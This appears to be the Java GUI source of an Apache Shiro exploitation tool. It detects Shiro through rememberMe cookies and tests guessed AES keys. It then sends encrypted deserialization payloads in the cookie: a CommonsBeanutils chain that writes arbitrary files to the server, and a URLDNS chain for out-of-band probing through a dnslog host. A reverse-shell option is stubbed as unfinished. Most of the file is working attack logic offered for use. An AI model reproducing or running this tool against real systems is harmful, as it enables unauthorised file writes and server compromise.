

import Util.AESUtils;
import Util.HTTPUtils;
import Util.SerializableUtils;
import com.formdev.flatlaf.FlatIntelliJLaf;
import org.apache.commons.codec.binary.Base64;
import org.apache.shiro.subject.SimplePrincipalCollection;

import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.HttpURLConnection;
import java.util.Enumeration;
import java.util.Map;

import static Util.GadGets.CB1;
import static Util.GadGets.URLDNS;


public class UI {
    private JButton CheckURLBTN;
    private JTextField URLAddress;
    private JComboBox HTTPMethod;
    private JTextField AESKey;
    private JComboBox gadgetsText;
    private JButton blastGadgetBTN;
    private JTextField FilePath;
    private JButton WriteFileBTN;
    private JTextArea FileContext;
    private JComboBox AESType;
    private JPanel mainJPanel;
    private JComboBox ProxyBTN;
    private JButton checkKeyBTN;
    private JComboBox rememberMeFlag;
    private JTextField cookieInputStr;
    Boolean isShiro = false;
    int cookieRememberMeCount = 0;
    String cookieRememberMeKey = "";
    /**
     * 之后增加爆破功能后 这里重新赋值为空值 ""
     */
    Object Gadgets = "CBString WriteFIle(默认)"; // 爆破利用链 或选择利用链之后绑定利用链代码


    public UI() {
        /**
         * 工具入口 唯一入口点
         */
        CheckURLBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 验证URL格式
                if (URLAddress.getText().equals("URL") || URLAddress.getText().equals("") || URLAddress.getText() == null) {
                    JOptionPane.showMessageDialog(null, "请填写URL", "提示", JOptionPane.WARNING_MESSAGE);
                } else if (!URLAddress.getText().startsWith("http")) {
                    JOptionPane.showMessageDialog(null, "请正确填写URL", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    HttpURLConnection conn = HTTPUtils.httpShiroSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), "", getCookieFlag(), getCookieStr());
                    checkIsShiro(conn);
                }
            }
        });
        checkKeyBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (!isShiro) {
                    JOptionPane.showMessageDialog(null, "请检查是否为Shiro框架", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    if (AESKey.getText().equals("Key") || AESKey.getText().equals("") || AESKey.getText() == null) {
                        JOptionPane.showMessageDialog(null, "请填写Key", "提示", JOptionPane.WARNING_MESSAGE);
                    } else {
                        // 漏洞探测类 空类即可
                        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
                        try {
                            // Shiro 秘钥正确会返回单个delete, Shiro秘钥不正确会返回两个delete
                            // 检查Shiro秘钥是否正确的三种思路,urldns,命令执行(ping|sleep),SimplePrincipalCollection(如果正确会返回一个delete)
                            // byte[] aesByte = AESUtils.CBCencrypt(SerializableUtils.serializ(SerializableUtils.URLDNS("http://aaa.abc.fg1gu7ys.dnslog.pw")), AESKey.getText());
                            byte[] aesByte = AESUtils.AESEncodeType(SerializableUtils.serializ(simplePrincipalCollection), AESKey.getText(), AESType.getSelectedItem().toString());
                            // byte[] aesByte = AESUtils.CBCencrypt(SerializableUtils.serializ(simplePrincipalCollection), AESKey.getText());
                            String rememberPayload = Base64.encodeBase64String(aesByte);
                            HttpURLConnection CheckKeyConn = HTTPUtils.httpShiroSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), rememberPayload, getCookieFlag(), getCookieStr());
                            checkShiroKey(CheckKeyConn, AESKey.getText());
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    }
                }
            }
        });
        /**
         * 爆破链功能未实现 写死CB链 后续加功能
         */
        blastGadgetBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (cookieRememberMeKey.equals("") || cookieRememberMeKey.equals("Key")) {
                    JOptionPane.showMessageDialog(null, "未确认秘钥可使用, 请重试秘钥", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
//                    Gadgets = "CB1";
//                    JOptionPane.showMessageDialog(null, "爆破成功,利用链为" + Gadgets, "提示", JOptionPane.WARNING_MESSAGE);
//                    Gadgets = GadGets.blastGadgets();
                    // 此处写爆破代码
                    JOptionPane.showMessageDialog(null, "爆破功能暂未实现, 直接选择即可", "提示", JOptionPane.WARNING_MESSAGE);

                }
            }
        });

        /**
         * 检查链的可用性
         * 检查的意义不大 不如直接爆破 考虑弃用此功能
         */
        /*
        checkGadgetsBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (cookieRememberMeKey.equals("") || cookieRememberMeKey.equals("Key")) {
                    JOptionPane.showMessageDialog(null, "未确认秘钥可使用, 请重试秘钥", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    try {
                        if (gadgetsText.getSelectedItem().equals("CBString WriteFIle(默认)")) {
                            CB1(FilePath.getText(), FileContext.getText());
                        } else if (gadgetsText.getSelectedItem().equals("URLDNS")) {
                            URLDNS(FilePath.getText());
                        } else if (gadgetsText.getSelectedItem().equals("CB反弹CS")) {
                            // 正在开发中
                            JOptionPane.showMessageDialog(null, "正在开发中, 请选择其他利用链进行利用", "提示", JOptionPane.WARNING_MESSAGE);
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }
        }); */

        /**
         * 利用链选择框实现方法
         * 选择完毕payload后 可以自动将工具布局更改为适合当前payload的布局
         */
        gadgetsText.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (gadgetsText.getSelectedItem().equals("CBString WriteFIle(默认)")) {
                    // 不对 文本框和文本路径进行操作
                    FilePath.setEnabled(true);
                    FilePath.setText("上传文件路径");
                    FileContext.setEnabled(true);
                    FileContext.setText("上传文件内容");
                    WriteFileBTN.setEnabled(true);
                    WriteFileBTN.setText("写入文件");
                    Gadgets = "CBString WriteFIle(默认)";
                } else if (gadgetsText.getSelectedItem().equals("URLDNS")) {
                    FilePath.setEnabled(true);
                    FilePath.setText("http://xxx.xxx.xxx");
                    FileContext.setEnabled(false);
                    FileContext.setText("请在上方文本框输入http://xxx.xxx.xxx");
                    WriteFileBTN.setEnabled(true);
                    WriteFileBTN.setText("探测出网");
                    Gadgets = "URLDNS";
                } else if (gadgetsText.getSelectedItem().equals("CB反弹CS")) {
                    FilePath.setEnabled(false);
                    FilePath.setText("111.111.111.111:8888");
                    FileContext.setEnabled(false);
                    FileContext.setText("正在开发中");
                    WriteFileBTN.setEnabled(false);
                    WriteFileBTN.setText("正在开发");
                } else {
                    FilePath.setEnabled(false);
                    FilePath.setText("正在开发中");
                    FileContext.setEnabled(false);
                    FileContext.setText("正在开发中");
                    WriteFileBTN.setEnabled(false);
                    WriteFileBTN.setText("正在开发");
                }
            }
        });

        WriteFileBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                boolean btnNextflag = false;
                if (Gadgets.equals("") || Gadgets == null || !WriteFileBTN.isEnabled()) {
                    JOptionPane.showMessageDialog(null, "请重新选择利用链", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    if (FilePath.isEnabled()) {
                        if (FilePath.getText().equals("")
                                || FilePath.getText() == null
                                || FilePath.getText().equals("文件地址")
                                || FilePath.getText().equals("上传文件路径")
                                || FilePath.getText().equals("111.111.111.111:8888")
                                || FilePath.getText().equals("正在开发中")
                        ) {
                            JOptionPane.showMessageDialog(null, "请写入文件地址", "提示", JOptionPane.WARNING_MESSAGE);
                        } else {
                            btnNextflag = true;
                        }
                    }
                    if (FileContext.isEnabled()) {
                        if (FileContext.getText().equals("")
                                || FileContext.getText() == null
                                || FileContext.getText().equals("文件内容")
                                || FileContext.getText().equals("上传文件内容")
                                || FileContext.getText().equals("正在开发中")
                                || FileContext.getText().equals("请在上方文本框输入http://xxx.xxx.xxx")
                        ) {
                            JOptionPane.showMessageDialog(null, "请写入文件内容", "提示", JOptionPane.WARNING_MESSAGE);
                        } else {
                            btnNextflag = true;
                        }
                    }

                    if (btnNextflag) {
                        int confirmWriteBTN = JOptionPane.showConfirmDialog(null, "确定执行吗", "提示", JOptionPane.WARNING_MESSAGE);
                        if (confirmWriteBTN == 0) { // 0代表确定
                            if (Gadgets == "CBString WriteFIle(默认)") {
                                System.out.println("文件写入路径" + FilePath.getText());
                                try {
                                    // 生成payload
                                    byte[] aesByte = AESUtils.AESEncodeType(SerializableUtils.serializ(CB1(FilePath.getText(), FileContext.getText())), AESKey.getText(), AESType.getSelectedItem().toString());
                                    String rememberPayload = Base64.encodeBase64String(aesByte);
                                    // send
                                    HttpURLConnection wfconn = HTTPUtils.httpShiroSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), rememberPayload, getCookieFlag(), getCookieStr());
                                    JOptionPane.showMessageDialog(null, "写入执行完毕 请检查服务器中是否有你的文件", "提示", JOptionPane.WARNING_MESSAGE);
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                    JOptionPane.showMessageDialog(null, "发生错误 请检查文件内容是否过长", "提示", JOptionPane.WARNING_MESSAGE);
                                }
                            } else if (Gadgets == "URLDNS") {
                                // 代码预留
                                System.out.println("请检查dnslog平台是否有回显->>>" + FilePath.getText());
                                try {
                                    // 生成payload
                                    byte[] aesByte = AESUtils.AESEncodeType(SerializableUtils.serializ(URLDNS(FilePath.getText())), AESKey.getText(), AESType.getSelectedItem().toString());
                                    String rememberPayload = Base64.encodeBase64String(aesByte);
                                    // send
                                    HttpURLConnection wfconn = HTTPUtils.httpShiroSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), rememberPayload, getCookieFlag(), getCookieStr());
                                    JOptionPane.showMessageDialog(null, "执行完毕 请检查平台是否有回显", "提示", JOptionPane.WARNING_MESSAGE);

                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                        } else if (confirmWriteBTN == 2) {// 2代表取消
                            // 代码预留 其实这里没啥用
                            JOptionPane.showMessageDialog(null, "取消成功", "提示", JOptionPane.WARNING_MESSAGE);
                        }
                    }
                }
            }
        });


    }

    /**
     * 获取自定义rememberMe字段
     *
     * @return
     */
    private String getCookieFlag() {
        return rememberMeFlag.getSelectedItem().toString();
    }

    /**
     * 获取Cookie请求参数
     *
     * @return
     */
    private String getCookieStr() {
        String temp = cookieInputStr.getText();
        temp = temp.replaceAll("Cookie:", "");
        temp = temp.replace("Cookie :", "");
        return temp;
    }

    /**
     * 检查是否为Shiro框架的秘钥
     * 通过比对响应体rememberMe字段的个数 判断秘钥是否正确  传入的为 simplePrincipalCollection 对象
     *
     * @param conn
     * @param ShiroKey
     */
    private void checkShiroKey(HttpURLConnection conn, String ShiroKey) {
        Map<String, java.util.List<String>> respHeaders = conn.getHeaderFields();
        java.util.List<String> Cookie = respHeaders.get("Set-Cookie");
        if (this.cookieRememberMeCount > getStrCount(Cookie.toString(), getCookieFlag() + "=deleteMe")) {
            JOptionPane.showMessageDialog(null, "秘钥正确", "提示", JOptionPane.WARNING_MESSAGE);
            this.cookieRememberMeKey = ShiroKey;
        } else {
            JOptionPane.showMessageDialog(null, "秘钥不正确", "提示", JOptionPane.WARNING_MESSAGE);
        }
    }

    /**
     * 通过响应头 检查是否为Shiro框架
     *
     * @param conn
     */
    private void checkIsShiro(HttpURLConnection conn) {
        Map<String, java.util.List<String>> respHeaders = conn.getHeaderFields();
        java.util.List<String> Cookie = respHeaders.get("Set-Cookie");
        this.cookieRememberMeCount = getStrCount(Cookie.toString(), getCookieFlag() + "=deleteMe");
        if (Cookie.toString().contains(getCookieFlag() + "=deleteMe")) {
            this.isShiro = true;
            JOptionPane.showMessageDialog(null, "确定为Shiro框架", "提示", JOptionPane.WARNING_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(null, "不是Shiro框架, 请检查rememberMe字段是否正确", "提示", JOptionPane.WARNING_MESSAGE);
        }
    }

    /**
     * 统计某个具体字符串出现的次数
     *
     * @param mainStr
     * @param subStr
     * @return
     */
    private static int getStrCount(String mainStr, String subStr) {
        int count = 0;
        int index = 0;
        int mainStrLength = mainStr.length();
        int subStrLength = subStr.length();
        if (subStrLength > mainStrLength) {
            return 0;
        }
        while ((index = mainStr.indexOf(subStr, index)) != -1) {
            count++;
            index += subStrLength;
        }
        return count;
    }

    public static void main(String[] args) {
        // 必须在窗体启动前设置
        // 设置使用Flat主题 亮色
//        FlatLightLaf.setup();
        // 设置使用Flat主题 暗色
//        FlatDarkLaf.setup();
        // 基于 FlatLaf Light）看起来像 IntelliJ IDEA 2019.2+ 中的 IntelliJ 主题
        FlatIntelliJLaf.setup();
        // （基于 FlatLaf Dark）看起来像来自 IntelliJ IDEA 2019.2+
//        FlatDarculaLaf.setup();

        UIManager.put("TextComponent.arc", 5);
        UIManager.put("Component.focusWidth", 1);
        UIManager.put("Component.innerFocusWidth", 1);
        UIManager.put("Button.innerFocusWidth", 1);
        UIManager.put("TitlePane.unifiedBackground", true);
        UIManager.put("TitlePane.menuBarEmbedded", false);

        // 设置字体抗锯齿
        System.setProperty("awt.useSystemAAFontSettings", "on");
        System.setProperty("swing.aatext", "true");
        Font fontUIResource = new Font("宋体", Font.PLAIN, 18);

        for (Enumeration keys = UIManager.getDefaults().keys(); keys.hasMoreElements(); ) {
            Object key = keys.nextElement();
            Object value = UIManager.get(key);
            if (value instanceof FontUIResource) {
                UIManager.put(key, fontUIResource);
            }
        }

        UIManager.put("defaultFont", fontUIResource);

        // 启动JFrame窗体 设置基本项
        JFrame frame = new JFrame("Shiro文件上传工具 by keleth");
        frame.setContentPane(new UI().mainJPanel);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setVisible(true);

        // 动态设置窗体格式
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        if (screenSize.getWidth() > 1280) {
            frame.setPreferredSize(new Dimension(900, 500));
        } else if (screenSize.getWidth() > 1024) {
            frame.setPreferredSize(new Dimension(700, 400));
        } else {
            frame.setPreferredSize(new Dimension(500, 300));
        }
        frame.pack();
        // 在屏幕中间启动
        frame.setLocationRelativeTo(null);
        // 设置关闭JFrame窗体时 后台进程一并关闭
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        // 使用Java的风格 会好看点 没卵用
//        frame.setDefaultLookAndFeelDecorated(true);
    }


}
